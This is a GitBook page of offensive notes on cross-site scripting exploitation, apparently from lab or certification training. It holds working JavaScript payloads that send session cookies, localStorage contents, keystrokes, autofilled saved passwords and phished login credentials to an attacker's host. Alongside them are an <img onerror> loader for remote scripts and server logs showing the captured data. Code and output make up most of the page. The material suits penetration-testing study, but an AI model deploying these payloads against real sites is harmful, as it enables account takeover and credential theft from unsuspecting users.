---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Exploitation

## Moving the Payload to an External Resource

Creating a JavaScript file containing the payload and serve that to the target by using `<script src="http://<attacker_IP>/xss.js"></script>` (Figure 1).

<figure><img src="../../../../.gitbook/assets/web_xss_exploitation_1.png" alt=""><figcaption><p>Figure 1: Serving a malicious JavaScript file to the target.</p></figcaption></figure>

{% hint style="warning" %}
This payload can't be used for any other XSS styles that won't automatically execute JavaScript, such as client XSS vulnerabilities that use `innerHTML`.
{% endhint %}

## Session Hijacking

We can create a malicious JavaScript file and exfiltrate the target's session cookie.

{% code title="xss.js" overflow="wrap" %}
```javascript
// save the value of the cookie in a variable
let cookie = document.cookie
// URL-encode the variable
let encodedCookie = encodeURIComponent(cookie)

// make a GET request to our attacker machine exfiltrating the cookie
fetch("http://192.168.45.214/exfil?data=" + encodedCookie)
```
{% endcode %}

We can serve the payload using the same script as above.

```javascript
<script src="http://192.168.45.214/xss.js"></script>
```

When the target clicks the malicious link, we will receive their cookie.

{% code overflow="wrap" %}
```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.198.101 - - [05/Aug/2024 12:07:13] "GET /xss.js HTTP/1.1" 200 -
192.168.198.101 - - [05/Aug/2024 12:07:13] code 404, message File not found
192.168.198.101 - - [05/Aug/2024 12:07:13] "GET /exfil?data=session%3DSomeExampleCookie HTTP/1.1" 404 -
```
{% endcode %}

If the cookie has the [`HttpOnly`](../../common-findings/cookie-flags.md) flag set, JavaScript cannot access it, thus, we can't exfiltrate its value.

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.198.101 - - [05/Aug/2024 12:15:53] "GET /xss.js HTTP/1.1" 200 -
192.168.198.101 - - [05/Aug/2024 12:15:53] code 404, message File not found
192.168.198.101 - - [05/Aug/2024 12:15:53] "GET /exfil?data= HTTP/1.1" 404 -
```

## Stealing Local Secrets

Browsers have two types of storage available: [`sessionStorage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage) and [`localStorage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage).

<table><thead><tr><th width="195">Type</th><th width="309">Description</th><th>Accessed by</th></tr></thead><tbody><tr><td><code>sessionStorage</code></td><td>Stores the data until the tab is closed</td><td><code>window.localStorage</code></td></tr><tr><td><code>localStorage</code></td><td>Stores the data until explicitly deleted</td><td><code>window.sessionStorage</code></td></tr></tbody></table>

To exfiltrate `localStorage`, we will convert the object into a string, URL-encode it, and use `fetch` to exfil the data.

{% code title="xssLocalStorage.js" %}
```javascript
let data = JSON.stringify(localStorage)
let encodedData - encodeURIComponent(data)
fetch("http://<attackerIP>/exfil?data=" + encodedData)
```
{% endcode %}

```javascript
// injected payload
<script src="http://192.168.45.214/xssLocalStorage.js"></script>
```

{% code overflow="wrap" %}
```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.45.214 - - [05/Aug/2024 16:54:47] "GET /xssLocalStorage.js HTTP/1.1" 200 -
192.168.45.214 - - [05/Aug/2024 16:54:47] code 404, message File not found
192.168.45.214 - - [05/Aug/2024 16:54:47] "GET /exfil?data=%7B%22BROWSER_OPT_KEY%22%3A%22%7B%5C%22httpOnlyCookie%5C%22%3A%7B%5C%22title%5C%22%3A%5C%22Use%20HttpOnly%20Cookie%5C%22%2C%5C%22value%5C%22%3Afalse%7D%2C%5C%22nonHttpOnlyCookie%5C%22%3A%7B%5C%22title%5C%22%3A%5C%22Use%20Non-HttpOnly%20Cookie%5C%22%2C%5C%22value%5C%22%3Atrue%7D%2C%5C%22phishing%5C%22%3A%7B%5C%22title%5C%22%3A%5C%22Blindly%20enter%20credentials%5C%22%2C%5C%22value%5C%22%3Afalse%7D%2C%5C%22savedPasswords%5C%22%3A%7B%5C%22title%5C%22%3A%5C%22Use%20stored%20password%5C%22%2C%5C%22value%5C%22%3Afalse%7D%2C%5C%22keyStrokes%5C%22%3A%7B%5C%22title%5C%22%3A%5C%22Simulate%20keystrokes%5C%22%2C%5C%22value%5C%22%3Afalse%7D%2C%5C%22localStorage%5C%22%3A%7B%5C%22title%5C%22%3A%5C%22Data%20in%20Local%20Storage%5C%22%2C%5C%22value%5C%22%3Afalse%7D%7D%22%7D HTTP/1.1" 404 -
```
{% endcode %}

## Keylogging

Keylogging is useful when our target is the user rather than the app, but it is limited in the sense that only the current user tab is logged. The JavaScript event for keypresses is `keydown`, which need to be passed into the `addEventListener` function which also accepts a callback function to run for each keydown event.

{% code title="xssKeylogger.js" %}
```javascript
function logKey(event){
    fetch("http://192.168.45.214/k?key=" + event.key)
}

// for each keypress, execute the callback function
document.addEventListener('keydown', logKey);
```
{% endcode %}

```javascript
// XSS payload
<script src='http://192.168.45.214/xssKeylogger.js'></script>
```

{% code overflow="wrap" %}
```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.45.214 - - [06/Aug/2024 06:37:32] "GET /xssKeylogger.js HTTP/1.1" 200 -
192.168.198.101 - - [06/Aug/2024 06:37:36] "GET /xssKeylogger.js HTTP/1.1" 200 -
192.168.198.101 - - [06/Aug/2024 06:37:37] code 404, message File not found
192.168.198.101 - - [06/Aug/2024 06:37:37] "GET /k?key=I HTTP/1.1" 404 -
192.168.198.101 - - [06/Aug/2024 06:37:37] code 404, message File not found
192.168.198.101 - - [06/Aug/2024 06:37:37] "GET /k?key=f HTTP/1.1" 404 -
192.168.198.101 - - [06/Aug/2024 06:37:37] code 404, message File not found
192.168.198.101 - - [06/Aug/2024 06:37:37] "GET /k?key= HTTP/1.1" 404 -
192.168.198.101 - - [06/Aug/2024 06:37:37] code 404, message File not found
192.168.198.101 - - [06/Aug/2024 06:37:37] "GET /k?key=I HTTP/1.1" 404 -
<SNIP>

# extract the keystrokes
$ grep 'key' keylogger_output.txt | awk -F'=' '{print $2}' | grep -o '^[a-zA-Z0-9{}]' | tr -d '\n'
IfItypealotonmykeyboardRyuggythinksImworkinghardOS{<SNIP>}
```
{% endcode %}

## Stealing Saved Passwords

If a password manager app autofills any login form, this information can be extracted via XSS. Password managers search for combination of a `username` or `email` input and an input that has `type` attribute set to `password`.

{% code title="xssSavedPasswords.js" %}
```javascript
// save the body of the document into a var
let body = document.getElementsByTagName("body")[0]

// create the username element
var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
//u.style.opacity = "0";

// create the password element
var p = document.createElement("input");
p.type = "password";
u.style.position = "fixed";
//u.style.opacity = "0";

// append elements to the body
body.append(u)
body.append(p)

// set a GET request after a 5 second timeout
setTimeout(function(){
    fetch("http://192.168.45.214/k?u=" + u.value + "&p=" + p.value)
    }, 5000);
```
{% endcode %}

```javascript
// XSS payload
<script src='http://192.168.45.214/xssSavedPasswords.js'></script>
```

{% code overflow="wrap" %}
```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.198.101 - - [06/Aug/2024 07:12:54] "GET /xssSavedPasswords.js HTTP/1.1" 200 -
192.168.198.101 - - [06/Aug/2024 07:12:59] code 404, message File not found
192.168.198.101 - - [06/Aug/2024 07:12:59] "GET /k?u=Ryuggy&p=ShavedHeadsFTW HTTP/1.1" 404 -
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/web_xss_savedPasswords.png" alt=""><figcaption><p>Figure 2: Exfiltrating saved passwords.</p></figcaption></figure>

## Phishing Users

Since we have full access to the HTML document, we could replicate an existing login page and change its `action` attribute to redirect the credentials to us (Figure 3).

<figure><img src="../../../../.gitbook/assets/web_xss_phising_1.png" alt=""><figcaption><p>Figure 3: Inspecting the login form's code.</p></figcaption></figure>

We can create a script that fetches the `login` page, replaces the current page's HTML with the fetched content, and then updates the first form's action URL and method. A step by step explanation can be found below:

1. `fetch("login")` -> fetch the content of the `login` page.
2. `.then(res => res.text().then(data => {` -> coverts the response to text (HTML content).
3. `document.getElementsByTagName("html")[0].innerHTML = data` -> replace the current HTML content of the page with the fetched HTML content.
4. `document.getElementsByTagName("form")[0].action = "http://192.168.45.214"` -> update the `action` attribute of the first form on the page to point to our server.
5. `document.getElementsByTagName("form")[0].method = "get"` -> update the `method` attribute of the first form on the page to use the `GET` method.

{% code title="xssPhishing.js" %}
```javascript
// grab the login page and access the response using 'then'
fetch("login").then(res => res.text().then(data => {
        document.getElementsByTagName("html")[0].innerHTML = data
        document.getElementsByTagName("form")[0].action = "http://192.168.45.214"
        document.getElementsByTagName("form")[0].method = "get"
}))
```
{% endcode %}

```javascript
// XSS payload
<script src='http://192.168.45.214/xssPhishing.js'></script>
```

{% code overflow="wrap" %}
```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.198.101 - - [06/Aug/2024 07:42:32] "GET /xssPhishing.js HTTP/1.1" 200 -
192.168.198.101 - - [06/Aug/2024 07:42:41] "GET /?username=gullible&password=IMaybeGullibleButMyPasswordsAreStrong HTTP/1.1" 200 -
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/web_xss_phising_2.png" alt=""><figcaption><p>Figure 4: Exfiltrating user credentials via a phishing attack.</p></figcaption></figure>

## Phishing Users (2)

This time the app does not have a login page, so we will have to create and redirect the target user to it. We can find boilerplate HTML login form code, such as [this](https://www.w3schools.com/howto/howto\_css\_login\_form.asp), and remove the unecessary parts for simplicity. We will need to change the `action` and `method` atrributes of the `form` element so that it sends a `GET` request to our malicious server.

{% code title="login.html" %}
```html
<!-- the action to perform -->
<form action="http://192.168.45.214/login" method="get">

  <div class="container">
    <!-- a label and input field pair for entering a username. -->
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>
    <!-- a label and input field pair for entering a password. -->
    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>
    
    <!-- the submit button -->
    <button type="submit">Login</button>
  </div>

</form>
```
{% endcode %}

If we spin up an HTTP server and test our script, we can see that it is working as intended (Figure 5).

<figure><img src="../../../../.gitbook/assets/web_xss_phising_3.png" alt=""><figcaption><p>Figure 5: Testing the <code>login.html</code> file.</p></figcaption></figure>

The issue here is that this app uses the [`innerHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security\_considerations) method to reconstuct the table, which means that we can't use the `<script>` tag in order to inject and execute a `.js` file directly (Figure 6). We are forced to use a payload based on the `<img>` tag.

<figure><img src="../../../../.gitbook/assets/web_xss_phising_4.png" alt=""><figcaption><p>Figure 6: Inspecting the <code>list.js</code> code.</p></figcaption></figure>

As a result, we need to find a way to execute our payload (`xssPhishingLogin.js`) via the `<img>` tag. This can be achieved by [creating a `script` element](https://www.codingbeautydev.com/blog/javascript-create-script-element?utm\_source=medium\&utm\_campaign=blog\&utm\_medium=social) from scratch within the `<img>` tag. Again, we will remove the unecessary parts from the code, and point it to our malicious server.

```javascript
const script = document.createElement('script');
// point the element's source to our malicious payload
script.src =
  'http://192.168.45.214/xssPhishingLogin.js';

script.async = true;

document.body.appendChild(script);
```

We now need to convert it into a one-liner by removing all the spaces and pass it in our `<img>`-based XSS payload.

{% code overflow="wrap" %}
```javascript
<img src="/" onerror='const script = document.createElement("script");script.src = "http://192.168.45.214/xssPhishingLogin.js";script.async = true;document.body.appendChild(script);'>
```
{% endcode %}

Finally, we need to create the `xssPhishingLogin.js` file. We need to use this to essentially replace the HTML of the List application with the HTML of our login form. For doing this, we need to convert our `login.html` code into a one-liner and use `innerHTML` to swap the HTML code.

{% code title="xssPhishingLogin.js" overflow="wrap" %}
```javascript
document.getElementsByTagName("html")[0].innerHTML = '<form action="http://192.168.45.214/login.html" method="GET"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="uname" required><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="psw" required><button type="submit">Login</button></div></form>'
```
{% endcode %}

Now that everything is in place, by injection our XSS payload into the vulnerable field, the target user will be redirected to our login form, and we should receive their credentials.

<figure><img src="../../../../.gitbook/assets/web_xss_phising_5.png" alt=""><figcaption><p>Figure 7: Injecting the XSS payload.</p></figcaption></figure>

{% code overflow="wrap" %}
```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.198.101 - - [06/Aug/2024 14:13:45] "GET /xssPhishingLogin.js HTTP/1.1" 200 -
192.168.198.101 - - [06/Aug/2024 14:13:51] "GET /login.html?uname=IDontHackStuff&psw=OS%7B<SNIP>%7D HTTP/1.1" 200 -
```
{% endcode %}
